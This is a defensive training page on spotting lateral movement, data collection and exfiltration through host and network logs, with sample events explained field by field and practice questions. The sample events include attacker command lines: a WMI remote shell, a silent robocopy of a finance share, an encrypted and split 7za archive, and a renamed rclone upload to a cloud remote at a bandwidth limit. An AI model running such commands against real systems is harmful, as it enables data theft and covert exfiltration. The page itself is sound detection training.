---
title: "Lateral Movement, Collection and Exfiltration — From One Foothold to Data Out the Door"
tags:
  - training
  - blue-team
  - endpoint
  - lateral-movement
  - exfiltration
---

# Lateral Movement, Collection and Exfiltration — From One Foothold to Data Out the Door { #lateral-collection-exfil }

!!! abstract "What this page covers"
    The last stretch of an intrusion. The first compromised machine is almost never where the valuable data lives, so the attacker **moves laterally**: they need two things on every new host — a way in (an exploit or, far more often, stolen credentials) and code to run there (built-in tools or malware they staged). We go through the remote-administration protocols they borrow (SMB with PsExec-style services, WMI, PowerShell remoting, SSH, RDP, VNC) and the exact events each one leaves on the *target* host. Then **collection** — searching files and shares, email, databases, screen capture and keylogging — and why lateral movement, privilege escalation and collection repeat in a loop. Then **exfiltration**, which is harder than it sounds: gigabytes have to leave a network that (ideally) blocks servers from talking to the internet, so the data is staged on a host that can get out, compressed, encrypted, split into pieces, and leaked slowly through whatever port is allowed. Every sample (4624 type 3 with 5145 `ADMIN$` and 7045 for a remote service, `WmiPrvSE.exe` and `wsmprovhost.exe` children, RDP 1149 and type 10, an SSH `auth.log` line, a share-access burst, a `7z` command line, firewall denies, a Zeek `conn.log` upload, a slow cloud-sync command line) is broken down field by field. We finish with a summary of the whole endpoint-attack section and practice questions.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. Hostnames, domains, accounts, IPs and file names are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. Attackers rarely land on their goal. The data they want sits deep inside, reachable only by privileged accounts, so they use the first host as a **foothold** and hop from machine to machine. That is **Lateral Movement (TA0008)**.
2. Every hop needs **two ingredients**: **access** to the next host (an exploit — **T1210** — or, much more commonly, valid stolen credentials — **T1078**) and **code to run** there (built-in OS tools need nothing; custom malware has to be copied over or put on a share first — **T1570 Lateral Tool Transfer**).
3. The attacker uses the **same remote-administration protocols your admins use** — SMB with a remote service (PsExec style), WMI, PowerShell remoting/WinRM, SSH on the command line; RDP, VNC or X11 forwarding for a GUI. These map to **T1021 Remote Services** (and **T1047** for WMI). The protocol is legitimate; **who, from where, and to where** is what's suspicious.
4. The best place to see lateral movement is the **target** host: a network logon (4624 type 3) or RDP logon (type 10), followed within seconds by a tell-tale **parent process** (`services.exe`, `WmiPrvSE.exe`, `wsmprovhost.exe`) starting a shell — plus a new service (7045) for PsExec-style tools.
5. **Collection (TA0009)** happens on every host reached: local and shared files, email, databases, screenshots, keystrokes — then copying what matters into a **staging** folder (**T1074 Data Staged**). Lateral movement, privilege escalation and collection repeat as a **cycle** until the attacker reaches what they came for.
6. **Exfiltration (TA0010)** is the hard part for the attacker: lots of data, servers that can't reach the internet, an outbound firewall to get through, and monitoring to avoid. So they **stage** the data on a host that can get out, **compress, encrypt and split** it (**T1560.001**), and send it **slowly** in small pieces (**T1030**, **T1029**).
7. Encryption hides *what* was stolen even from full packet capture — so the **command line** of the archiving tool (process creation logging) may be the only record of which files left, and sometimes it even contains the password.
8. On a well-run network with **default-deny outbound**, the attacker usually trips **firewall deny logs** while looking for a way out, and then has to use the **expected protocol on an allowed port** (HTTPS through the proxy). Detection then depends on the **destination** and the **volume and timing** of uploads.

## Lateral movement { #lateral }

### Why the first host is rarely enough { #why }

Think of a burglar who gets into a large office building through a ground-floor window. The safe is on the twelfth floor, in a room that needs a manager's badge. The window got them *in*, but they still have to walk the corridors, borrow badges and take the lift before they reach anything worth stealing.

A targeted intrusion works the same way. The first victim is usually whoever opened the phishing email or whichever internet-facing server had the bug — a normal user's laptop, a web server in the DMZ. The real targets — the finance file server, the customer database, the domain controller, the backup system — sit deeper inside and are reachable only with **privileged accounts**. So the attacker keeps the first host as a **foothold** and uses it to reach the next machine, and the next, picking up credentials and privileges along the way. ATT&CK calls this **Lateral Movement (TA0008)**.

That is also why the previous pages matter here: privilege escalation gives admin on one host, credential dumping turns that into *other people's* accounts, and lateral movement **spends** those accounts on new hosts.

### The two ingredients: access and code { #ingredients }

To do anything on a remote machine, the attacker needs two separate things:

| Ingredient | How they get it | ATT&CK |
| --- | --- | --- |
| **Access** to the remote host | An exploit against a network service (e.g. an unpatched SMB or RDP flaw) | T1210 Exploitation of Remote Services |
| | **Legitimate credentials** — stolen passwords, hashes or tickets (by far the most common) | T1078 Valid Accounts, T1550 Use Alternate Authentication Material |
| **Code** to run there | Built-in commands (`cmd`, PowerShell, `net`, `reg`, `wmic`…) — nothing to bring | (various, e.g. T1059) |
| | Their own malware or tools — copied to the host or put on a share it can reach | T1570 Lateral Tool Transfer |

When attackers copy their tools onto a host, they like **places nobody looks**: temporary folders, `C:\ProgramData`, `C:\Users\Public`, and even the **Recycle Bin** (`C:\$Recycle.Bin\<SID>\`), which is hidden and system-like. A file-creation event in such a path, written over SMB from another machine, is a classic sign:

```
Event ID: 11   File created
UtcTime:        2026-11-18 03:41:09.220
Image:          System
TargetFilename: C:\$Recycle.Bin\S-1-5-21-1111111111-2222222222-3333333333-1104\$RX2K9QF.exe
User:           NT AUTHORITY\SYSTEM
```

- `Event ID 11` — Sysmon "file created".
- `Image System` — the file was written by the **kernel's SMB server** (the `System` process, PID 4), i.e. it arrived **over the network** from another machine, not from a local program.
- `TargetFilename C:\$Recycle.Bin\…\$RX2K9QF.exe` — an **executable** inside a user's Recycle Bin folder. Real deleted files are renamed `$R…` with their original extension, but nothing legitimately *delivers* an `.exe` into the Recycle Bin over SMB.

### The protocols attackers borrow { #protocols }

Here is the uncomfortable part: lateral movement is **easy**, because every operating system ships with good tools for controlling one machine from another. They exist so admins don't have to walk to each server — and they work just as well for anyone holding the right credentials.

| Need | Protocol / method | Port | ATT&CK | What it looks like on the target |
| --- | --- | --- | --- | --- |
| Command line | SMB + remote service (PsExec style) | TCP 445 | T1021.002 + T1569.002 | 4624 type 3 → 5145 `ADMIN$` → 7045 new service → `services.exe` starts the payload |
| Command line | WMI | TCP 135 + high dynamic port | T1047 | 4624 type 3 → `WmiPrvSE.exe` starts `cmd.exe`/`powershell.exe` |
| Command line | PowerShell remoting / WinRM | TCP 5985/5986 | T1021.006 | 4624 type 3 → `wsmprovhost.exe` runs the commands |
| Command line | SSH | TCP 22 | T1021.004 | `sshd` "Accepted …" in `auth.log`/journal; on Windows OpenSSH its own log |
| GUI | RDP | TCP/UDP 3389 | T1021.001 | 1149, 4624 type 10, `rdpclip.exe`, a new desktop session |
| GUI | VNC | TCP 5900+ | T1021.005 | The VNC server's own log; often **no Windows logon event** at all |
| GUI | X11 forwarding (Linux) | over SSH | T1021.004 | An SSH session with X11 forwarding requested |

The network side of each protocol is covered in [SMB](../other-protocols/smb.md), [SSH, RDP and VNC](../other-protocols/ssh-rdp-vnc.md) and [PowerShell remoting, FTP and ICMP](../other-protocols/psremoting-ftp-icmp.md). Here we look at what the **target host** records.

### On the target: SMB + a remote service (PsExec style) { #psexec }

The PsExec pattern has three steps: log in over SMB, copy a program into the hidden admin share `ADMIN$` (= `C:\Windows`), and ask the remote Service Control Manager to create and start a service that runs it. Each step leaves an event on the target:

```
EventID:                   4624
Computer:                  FS-FIN-02.corp.example
LogonType:                 3
TargetUserName:            c.ito
TargetDomainName:          CORP
LogonProcessName:          NtLmSsp
AuthenticationPackageName: NTLM
WorkstationName:           SRV-APP-07
IpAddress:                 10.20.4.37
TargetLogonId:             0x9A41C2
```

- `4624` — "an account was successfully logged on". It fires on the machine **being logged on to**.
- `LogonType 3` — a **network** logon: the user didn't sit down or RDP; something connected to a service (here SMB).
- `TargetUserName c.ito` — the account used. Is this person ever supposed to touch a finance file server from an application server?
- `AuthenticationPackageName NTLM` — NTLM rather than Kerberos; between domain machines that is worth a second look (pass-the-hash forces NTLM — see [Credential Dumping](credential-dumping-mimikatz.md#use)).
- `WorkstationName SRV-APP-07` / `IpAddress 10.20.4.37` — the **source** of the hop.
- `TargetLogonId 0x9A41C2` — the session ID; every following event in this session carries the same value, so you can chain them.

```
EventID:            5145
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
SubjectLogonId:     0x9A41C2
ShareName:          \\*\ADMIN$
ShareLocalPath:     \??\C:\Windows
RelativeTargetName: svcupd.exe
AccessMask:         0x2
IpAddress:          10.20.4.37
```

- `5145` — "a network share object was checked to see whether the client can be granted desired access". It is produced only if **Detailed File Share** auditing is enabled (it is noisy, so many places don't — check yours).
- `SubjectLogonId 0x9A41C2` — the same session as the 4624 above.
- `ShareName \\*\ADMIN$` / `ShareLocalPath C:\Windows` — the hidden **administrative share**. Normal users never write here.
- `RelativeTargetName svcupd.exe` — the file being written into `C:\Windows`.
- `AccessMask 0x2` — `WriteData`: the client is **writing** a file, not just reading.

```
Log Name:     System
Source:       Service Control Manager
EventID:      7045
Service Name: svcupd
Image Path:   %SystemRoot%\svcupd.exe
Service Type: user mode service
Start Type:   demand start
Account Name: LocalSystem
```

- `7045` — "a service was installed in the system" (System log). The Security log equivalent is **4697**, if "Security System Extension" auditing is on.
- `Image Path %SystemRoot%\svcupd.exe` — the file just dropped via `ADMIN$`. The genuine PsExec tool uses a service named `PSEXESVC`; clones and attack frameworks use **random or harmless-sounding names**, so don't key on the name.
- `Start Type demand start` + `Account Name LocalSystem` — started on request, running as **SYSTEM**. A brand-new on-demand SYSTEM service whose binary arrived over SMB seconds earlier is the PsExec signature.

Then **4688/Sysmon 1** shows `services.exe` → `svcupd.exe` → `cmd.exe`. Line all four up by time and logon ID and the hop is proven. Deeper detail: [PsExec over SMB](../../../adversary/psexec-smb.md).

### On the target: WMI and PowerShell remoting { #wmi-winrm }

With WMI there is no file copy and no service. The target's WMI provider host simply starts the command:

```
EventID:            4688
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
NewProcessName:     C:\Windows\System32\cmd.exe
CommandLine:        cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1
ParentProcessName:  C:\Windows\System32\wbem\WmiPrvSE.exe
```

- `ParentProcessName …\WmiPrvSE.exe` — the WMI provider host. On a server it legitimately starts very few shells; **`WmiPrvSE.exe` → `cmd.exe`/`powershell.exe`** is the WMI lateral-movement shape (**T1047**).
- `CommandLine cmd.exe /Q /c whoami` — `/Q` turns echo off, `/c` runs one command and exits.
- `1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1` — writes the output into a file in `ADMIN$` on **itself** (`127.0.0.1`) so the remote attacker can read it back over SMB. A timestamp-like file name under `ADMIN$` is a well-known pattern of common attack toolkits.

PowerShell remoting runs commands inside a host process on the target:

```
EventID:            4688
NewProcessName:     C:\Windows\System32\wsmprovhost.exe
CommandLine:        C:\Windows\system32\wsmprovhost.exe -Embedding
ParentProcessName:  C:\Windows\System32\svchost.exe
SubjectUserName:    c.ito
```

- `wsmprovhost.exe` — the WinRM plug-in host; **one appears per remote PowerShell session**. Anything it spawns, and every script block it runs (PowerShell **4104**, see [Execution, Persistence and Discovery](execution-persistence-discovery.md)), belongs to the remote user. The `Microsoft-Windows-WinRM/Operational` log on the target also records the session being created. Deeper detail: [WMI and WinRM](../../../adversary/wmi-winrm.md).

### On the target: RDP and SSH { #rdp-ssh }

RDP leaves events in two places:

```
Log Name:  Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
EventID:   1149
User:      c.ito
Domain:    CORP
Source Network Address: 10.20.4.37
```

```
EventID:          4624
LogonType:        10
TargetUserName:   c.ito
IpAddress:        10.20.4.37
LogonProcessName: User32
```

- `1149` — "Remote Desktop Services: user authentication succeeded". It records the **network connection** being authenticated, with the source address — useful even when the Security log has rolled over.
- `4624 LogonType 10` — **RemoteInteractive**: a full desktop session. (On recent Windows with Network Level Authentication you may also see a type 3 just before it.) Type 10 means the user's credentials are now **in this host's memory**, ready for the next dump — the chain from the previous page.

On Linux, SSH logins land in `/var/log/auth.log` (Debian/Ubuntu) or `/var/log/secure` (RHEL family), or only in the systemd journal on newer systems:

```
Nov 18 03:52:14 db-cust-01 sshd[48211]: Accepted publickey for svc_backup from 10.20.4.37 port 51522 ssh2: ED25519 SHA256:k3Vq...redacted
```

- `Nov 18 03:52:14` — local timestamp (no year, no time zone — a classic syslog limitation).
- `db-cust-01` — the host that logged it; `sshd[48211]` — the SSH daemon process and its PID.
- `Accepted publickey` — login succeeded with a **key**, not a password. Attackers who find private keys in a compromised user's `~/.ssh/` use exactly this.
- `for svc_backup from 10.20.4.37 port 51522` — the account, and where it came from. A backup service account logging in interactively at 03:52 from an application server is the lead.
- `ED25519 SHA256:k3Vq…` — the **fingerprint of the key** used. Match it against `authorized_keys` to see which key — and therefore which stolen copy — was used.

!!! tip "[Supplement] The simplest lateral-movement detection: who normally talks to whom"
    In most networks, **workstations don't log on to other workstations**, and normal users don't RDP to servers. Admins connect from a small set of admin machines or jump hosts. So a baseline of "source host → destination host → account → logon type" catches a lot: a 4624 type 3 or 10 between two user laptops, an account logging on to many hosts within minutes (fan-out), or a new source for a privileged account. The same idea works on the network with Zeek `conn.log` or flow data: count distinct internal destinations on ports 445, 135, 5985, 3389 and 22 per source, per hour.

## Collection { #collection }

### What gets collected { #what-collected }

Each time a new host is reached, the attacker searches it for anything useful: more credentials, intellectual property, personal data, financial records, or simply information that helps the next step. ATT&CK's **Collection (TA0009)** tactic lists the usual targets:

| What | ATT&CK | Typical evidence |
| --- | --- | --- |
| Files on the host | T1005 Data from Local System | Burst of file reads (4663 if auditing that folder; EDR file events), `dir /s`, `findstr` searches |
| Files on shares | T1039 Data from Network Shared Drive | Burst of **5145/5140** on the file server from one account and one source |
| Screenshots / video | T1113 Screen Capture, T1125 Video Capture | Unusual process loading screen-capture APIs, image files appearing in temp folders |
| Keystrokes | T1056.001 Keylogging | Code hooking keyboard input; small log files that grow steadily |
| Email | T1114 Email Collection | Mailbox export, PST files on disk, unusual mailbox access in cloud audit logs |
| Databases / repositories | T1213 Data from Information Repositories (and T1005) | `sqlcmd`/`bcp`/`mysqldump` command lines, very large query results |
| Getting it ready to leave | T1074 Data Staged (.001 local, .002 remote), T1560 Archive Collected Data | Large archives appearing in `ProgramData`, `Temp`, `Public`, or on a "staging" host |

How much the attacker can collect depends on the **privileges** of the account they hold on each machine. That's why the steps repeat in a loop:

```
   lateral movement --> privilege escalation --> credential dumping
          ^                                             |
          |                                             v
          +------------------- collection <-------------+
                  (until the target data is reached, then: stage -> exfiltrate)
```

### A collection burst on a file server { #share-burst }

A human user opens a handful of files from a share. A collection script walks the entire tree. On the file server, that difference is visible if share auditing is on:

```
03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3.xlsx            0x1 (ReadData)
03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3_draft.xlsx      0x1 (ReadData)
03:58:03  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\bank_details.csv           0x1 (ReadData)
...       (3,914 more in 6 minutes)
04:04:11  5145  c.ito  10.20.4.37  \\*\Finance  Archive\2019\audit\ledger.xlsx     0x1 (ReadData)
```

- Columns: time, event ID, account, source IP, share, relative path, access mask.
- **Same account, same source, thousands of files in minutes, walking from current folders back into old archives** — nobody reads that way. `0x1` (`ReadData`) on everything means the files are being **read in full**, i.e. copied.
- The source `10.20.4.37` is `SRV-APP-07` — the host from the earlier hops. Collection is often run *from the foothold* across the network.

The matching endpoint view is often a single copy command into a staging folder:

```
EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\Windows\System32\Robocopy.exe
CommandLine:       robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f /E /MT:4 /R:0 /W:0 /NFL /NDL /NJH
ParentProcessName: C:\Windows\System32\cmd.exe
```

- `robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f` — copy the whole Finance share into an innocent-looking folder under `ProgramData` (**T1039** + **T1074.001**).
- `/E` — include all subfolders. `/MT:4` — 4 threads (faster). `/R:0 /W:0` — don't retry locked files, don't wait.
- `/NFL /NDL /NJH` — **no file list, no directory list, no job header**: suppress the output that would show *what* was copied. Quiet flags are typical of scripted theft.

## Exfiltration { #exfil }

### Why getting data out is harder than reading it { #why-hard }

Reading a database is one thing; carrying a copy of it out of the building is another. The burglar on the twelfth floor can *look* at every document in the safe, but walking out of reception with forty boxes of paper is a different problem.

The attacker's constraints:

1. **Volume.** Valuable data is often big — gigabytes or terabytes.
2. **Servers can't reach the internet.** Good practice blocks internal servers from talking straight to the internet, so the data can't be sent from where it lives.
3. **So it must be moved inside first** — copied to a **staging** host (a workstation or server that *can* get out). That internal move is itself detectable.
4. **They need an open path out**: an allowed destination, port and protocol through the border firewall.
5. **They want to hide the content**, so that if the transfer is seen, nobody can tell what was taken.
6. **They must go slowly**, so the host doesn't appear on "top uploaders" lists from flow data, or trip IDS, DLP or firewall thresholds.

### The typical sequence { #sequence }

```
                                   Internet
                                       ^
                                       |  (4) many small encrypted pieces,
                                       |      slowly, through an allowed path
   +-----------------+   (2) access    |
   |  DB server      |<---------+      |
   | (no internet)   |          |      |
   +--------+--------+   +------+------+------+
            |            |  Infected host     |  (1) attacker has interactive
            +----------->|  (foothold, C2)    |      C2 on this machine
          (3) copy of    +--------------------+
              the data staged here
```

1. **Interactive control.** The attacker has a working command-and-control channel to a victim machine and credentials or exploits that reach the data.
2. **Access the data** from that machine — over Windows file sharing, an SSH session, a database client, whatever reaches it.
3. **Stage a copy** back on the controlled machine (or another one that can reach the internet). This step exists precisely because the database server **can't** reach the internet directly.
4. **Prepare and send.** Compress, encrypt and split into pieces, then leak them out slowly.

### Compress, encrypt, split — and why the command line matters { #archive }

Archiving tools that support passwords and multi-part volumes do all three jobs at once (**T1560.001 Archive via Utility**):

```
EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\ProgramData\cache\7za.exe
CommandLine:       7za.exe a -t7z -mx9 -mhe=on -p[redacted] -v95m C:\ProgramData\cache\upd.7z C:\ProgramData\cache\f\*
ParentProcessName: C:\Windows\System32\cmd.exe
```

- `7za.exe` from `C:\ProgramData\cache\` — the stand-alone command-line build of a popular archiver, **brought in by the attacker** (it isn't installed there).
- `a` — **add** files to an archive. `-t7z` — 7z format.
- `-mx9` — maximum compression: smaller total size = fewer bytes to sneak out.
- `-mhe=on` — **encrypt the headers** too, so even the **file names** inside the archive are hidden. Without this, a captured archive still reveals which files are inside.
- `-p[redacted]` — the archive password. In real logs it appears **in clear text** in the command line — if you recover the pieces later, this may let you open them and see exactly what was stolen.
- `-v95m` — split into **95 MB volumes** (`upd.7z.001`, `upd.7z.002`, …): small enough to send one at a time, under typical upload-size alerts.
- `…\f\*` — the input: the staging folder filled by the `robocopy` above.

Why the attacker bothers:

- **Smaller**: compression shrinks the data — fewer bytes, less time on the wire.
- **Pieces**: no single giant transfer; each piece looks like an ordinary upload.
- **Hidden content**: even if your network captures every packet, you see only encrypted blobs. **The only record of *what* left may be this one command line** (and the files it read). That is a strong argument for process-creation logging *with command lines* everywhere — covered in detail in the Important Events section.

### Finding a way out { #way-out }

Encrypted pieces still need a path out: a destination (IP or domain), a destination port and an application protocol. On a network with a **default-deny outbound** policy — which, unfortunately, not every organisation has — most options are already closed.

Imagine a border firewall that allows only:

- TCP **25** (SMTP) — and only from the **mail server**,
- TCP **80/443** (HTTP/HTTPS) — and only from the **web proxy**.

From the staging host, the attacker first has to discover this — often by trial and error, which leaves **deny logs**:

```
2026-11-18T04:20:51Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50112 dst=203.0.113.50 dport=22  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50113 dst=203.0.113.50 dport=21  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50114 dst=203.0.113.50 dport=443 rule=default-deny-out
2026-11-18T04:20:53Z fw-edge-01 action=deny proto=udp src=10.20.4.37 sport=50115 dst=203.0.113.50 dport=53  rule=default-deny-out
```

- `action=deny` … `rule=default-deny-out` — the default "block everything not explicitly allowed" rule fired.
- `src=10.20.4.37` — an **internal server** trying to connect **directly** to the internet. Servers shouldn't — that's why it was blocked.
- `dst=203.0.113.50` with `dport` 22, 21, 443, 53 one second apart — the same external host tried on **several ports in a row**: someone probing for an open path. Even `443` was denied because only the proxy may use it.

A run like this is one of the **cheapest, earliest exfiltration signals** you will ever get. Many SOCs don't alert on outbound denies at all; they should at least alert on internal servers producing them.

Once the attacker realises only the proxy gets out, they use the **correct protocol on the allowed port** — HTTPS through the proxy, to a cloud storage service, a file-sharing site or their own server. Now content inspection mostly can't help (it's TLS, and the data is encrypted inside anyway). What's left:

- **Destination** — a new or rare domain, a newly registered domain, a personal cloud-storage account, an IP with no reputation ([Domain signals](../dns/domain-signals.md), [Files, frequency and naked IPs](../http-analysis/files-frequency-naked-ip.md)).
- **Volume and direction** — normal browsing *downloads* much more than it *uploads*. Exfiltration flips that:

```
ts             uid       id.orig_h   id.resp_h     id.resp_p proto service duration  orig_bytes  resp_bytes
1763441245.10  CzQ81e3a  10.20.9.15  198.51.100.77 443       tcp   ssl     1834.22   99614201    48122
```

- `id.orig_h 10.20.9.15` — the proxy (the connection to the internet starts there); proxy logs tell you which internal client asked for it.
- `id.resp_h 198.51.100.77:443` — the external destination.
- `duration 1834.22` — a single connection open for about 30 minutes.
- `orig_bytes 99614201` — about **95 MB sent out** (≈ one archive volume), against `resp_bytes 48122` (~47 KB back). A **2,000-to-1 upload ratio** is not browsing.
- **Timing** — repeated uploads of similar size at regular intervals, or always at night (**T1029 Scheduled Transfer**), each under a size threshold (**T1030 Data Transfer Size Limits**).

!!! tip "[Supplement] Low and slow — the arithmetic"
    Why "slowly" works: 40 GB sent at 2 MB/s takes about 5.7 hours and puts the host at the top of any upload chart. The same 40 GB at 200 KB/s takes about **2.4 days** — but in any one hour it moves only ~700 MB, which can hide among normal backups and cloud sync. That's why per-host **cumulative upload over days**, not just per-hour peaks, is worth tracking.

A common real-world shape is a legitimate **cloud-sync or file-transfer tool** used by the attacker (ReliaQuest and others have reported tools such as Rclone, WinSCP and cURL as frequent exfiltration choices). The command line gives it away:

```
EventID:           4688
NewProcessName:    C:\ProgramData\cache\svhelper.exe
OriginalFileName:  rclone.exe
CommandLine:       svhelper.exe copy C:\ProgramData\cache\ remote01:bkp-2026 --include "upd.7z.*" --bwlimit 200k --transfers 1 --config C:\ProgramData\cache\s.conf
SubjectUserName:   c.ito
```

- `NewProcessName svhelper.exe` but `OriginalFileName rclone.exe` — **renamed** binary. The original name is embedded in the file's version information (Sysmon 1 shows `OriginalFileName`); a mismatch is a red flag on its own.
- `copy C:\ProgramData\cache\ remote01:bkp-2026` — copy the staging folder to a cloud storage target defined in the config file.
- `--include "upd.7z.*"` — only the archive volumes from the `7za` step.
- `--bwlimit 200k` — **limit bandwidth to 200 KB/s**: low and slow, written right into the command.
- `--transfers 1` — one file at a time, to look like a single normal connection.
- `--config …\s.conf` — the destination account and credentials live in this file; collect it during the investigation — it tells you **where** the data went.

ATT&CK names the main exit routes: **T1041** Exfiltration Over C2 Channel (through the existing command-and-control connection), **T1048** Exfiltration Over Alternative Protocol (e.g. FTP, DNS — see [DNS abuse](../dns/dns-abuse.md)), **T1567** Exfiltration Over Web Service (e.g. **.002** to cloud storage, **.004** over webhooks such as chat or automation services), and **T1537** Transfer Data to Cloud Account.

## Endpoint attack tactics — section summary { #summary }

Looking back over this section, an intrusion splits into two big phases using the kill-chain stages:

| Phase | Kill-chain stages | Best seen from | What the attacker does |
| --- | --- | --- | --- |
| **Pre-exploitation** | 1 Reconnaissance, 2 Weaponisation, 3 Delivery, 4 Exploitation | Mostly **network** (email, web, perimeter) | Find a target, build the lure or exploit, deliver it, get code running |
| **Post-exploitation** | 5 Installation, 6 Command and Control, 7 Actions on Objectives | Mostly **host** (process, logon, file, registry events) | Execution, persistence, discovery, privilege escalation, credential access, lateral movement, collection, exfiltration |

ATT&CK concentrates on the **post-exploitation** half and breaks it into **tactics** (the *why*: Persistence, Lateral Movement, Exfiltration…), each achieved by many **techniques** (the *how*). Studying that matrix tells you both what to expect and where each technique leaves evidence.

Post-exploitation is where detection matters most: the attacker is inside and making steady progress towards the goal, and **most of these techniques are only clearly visible on the host**. Network data shows that `SRV-APP-07` talked SMB to `FS-FIN-02`; the host data shows `c.ito` logging on, a service being created, `robocopy` walking the Finance share and `7za` encrypting the result. That is why the next section turns to **endpoint defence in depth** — controls and telemetry that catch the attacker as early in this sequence as possible.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The model on this page still describes most hands-on intrusions and ransomware cases: a foothold, credential theft, lateral movement over **legitimate remote-administration protocols** (SMB/remote services, WMI, WinRM, RDP, SSH), collection into a staging folder, archiving, and exfiltration through whatever path is allowed. The detection points — target-side logon plus parent process, new services, share-access bursts, archiver command lines, outbound denies, upload volume and ratio — are still the core of lateral-movement and exfiltration detection. Default-deny outbound and keeping servers off the internet are still among the most effective controls.

!!! info "[Changed] What has changed"
    - **Data theft is often the whole point now.** Ransomware groups increasingly steal data first ("double extortion") and some skip encryption entirely and extort with the stolen data alone. Industry reporting through 2025–2026 (for example from Google Threat Intelligence) describes this shift. Exfiltration is no longer a side effect; for many incidents it **is** the impact.
    - **Legitimate tools and cloud services are the default exit.** Attackers favour renamed sync and transfer tools (Rclone, WinSCP, cURL and similar) and mainstream cloud storage, file-sharing and webhook services over custom protocols — so destination allow-listing, cloud-app control (CASB) and `OriginalFileName`/signature checks matter more than port rules.
    - **Lateral movement also happens in the cloud.** In hybrid environments, stolen session tokens and cloud admin roles let attackers move between SaaS apps, cloud consoles and on-premises systems without touching SMB at all (ATT&CK **T1021.007 Cloud Services**, **T1550.001 Application Access Token**). Cloud audit logs (Entra ID sign-ins, unified audit log, cloud trail logs) are part of lateral-movement detection now.
    - **Remote management tools.** Commercial remote-access/RMM software (see [Remote tools](../other-protocols/remote-tools-summary.md)) is now one of the most common ways attackers move and keep control (**T1219 Remote Access Tools**) — it looks like IT support and often bypasses Windows logon telemetry.
    - **Windows defaults are tightening** (e.g. SMB signing required by default on Windows 11 24H2 and Windows Server 2025, NTLM being phased out), which raises the bar for relay and pass-the-hash — but not for an attacker with a valid password or ticket.

!!! warning "[Caution] Where the old way is wrong or risky today"
    - **Don't look for lateral movement only on the network.** Encrypted SMB 3, WinRM over HTTPS and RDP hide the content; the target host's 4624 + parent process + 7045 is where the proof is. Make sure **5145** (or EDR equivalents) and command-line logging are actually enabled — they are off by default.
    - **Don't key on tool names.** `PSEXESVC`, `rclone.exe`, `7z.exe` are trivially renamed. Detect the **shape**: new SYSTEM service from a file just written to `ADMIN$`, `WmiPrvSE.exe` spawning a shell, `OriginalFileName` mismatches, archives created with header encryption and volume splits.
    - **Don't treat "allowed traffic" as safe.** Most real exfiltration uses HTTPS on 443 through the proxy to a reputable cloud service. Track upload volume, ratio and destination per host over **days**, and alert on internal servers that ever try to reach the internet directly.
    - **Don't rely on full packet capture to tell you what was stolen.** The data will be encrypted; preserve the endpoint (command lines, staging folders, archive config files) before cleaning up, because that is where the answer is — and it may decide your breach-notification obligations.

## Practice questions { #quiz }

### Question 1

On `FS-FIN-02` you find, within ten seconds: a 4624 type 3 for `c.ito` from `10.20.4.37` using NTLM; a 5145 with `ShareName \\*\ADMIN$`, `RelativeTargetName svcupd.exe`, `AccessMask 0x2`; and a 7045 for a new service `svcupd` with image `%SystemRoot%\svcupd.exe`, demand start, LocalSystem. What happened, which ATT&CK techniques fit, and what do you check next?

??? success "Answer and explanation"
    This is **PsExec-style lateral movement**: someone logged on over the network as `c.ito` (4624 type 3), **wrote an executable into `C:\Windows` through the hidden admin share** (5145, `WriteData` on `ADMIN$`), then **created an on-demand service running as SYSTEM** pointing to that file (7045). Techniques: **T1021.002** SMB/Windows Admin Shares, **T1569.002** Service Execution, **T1570** Lateral Tool Transfer, and **T1078** Valid Accounts (or T1550.002 if pass-the-hash — the NTLM package supports that suspicion).

    Next: check 4688/Sysmon 1 for `services.exe` → `svcupd.exe` → children to see what ran; hash and collect `svcupd.exe`; pivot to the source `10.20.4.37` (`SRV-APP-07`) to find how `c.ito` was obtained (credential dumping there); search all hosts for other 4624s from that source and other new services; treat `c.ito` as compromised and reset it.

### Question 2

Why do attackers usually compress, encrypt and split data before exfiltrating it, and what does that mean for the SOC?

??? success "Answer and explanation"
    **Compression** reduces the number of bytes to move. **Splitting** into volumes (e.g. 95 MB each) lets them send small pieces slowly, staying under upload-size and "top talker" thresholds instead of one giant transfer. **Encryption** (with header encryption, also the file names) means that even if the SOC captures the traffic, it can't see what was taken.

    For the SOC: content inspection and packet capture won't reveal what was stolen, so **process-creation logs with command lines** become crucial — the archiver's command line shows the input folders and may even contain the password. Investigators should preserve the staging folder, archive volumes and tool configuration files. Detection shifts to **behaviour**: archive creation by unusual tools in odd folders, large internal copies to a staging host, and outbound upload volume, ratio, timing and destination.

### Question 3

Your border firewall is default-deny outbound; only the mail server may use port 25 and only the web proxy may use 80/443. An analyst says "so exfiltration can't happen here". What is wrong with that, and what should you monitor?

??? success "Answer and explanation"
    Default-deny outbound removes most direct routes and forces the attacker through narrow, monitored paths — a big win — but it doesn't stop exfiltration. The attacker can send data **through the proxy over HTTPS** like any user (to cloud storage, file-sharing sites, webhooks), use the **existing C2 channel**, or abuse **DNS** if internal resolvers forward to the internet. Using the expected protocol on an allowed port defeats port-based rules.

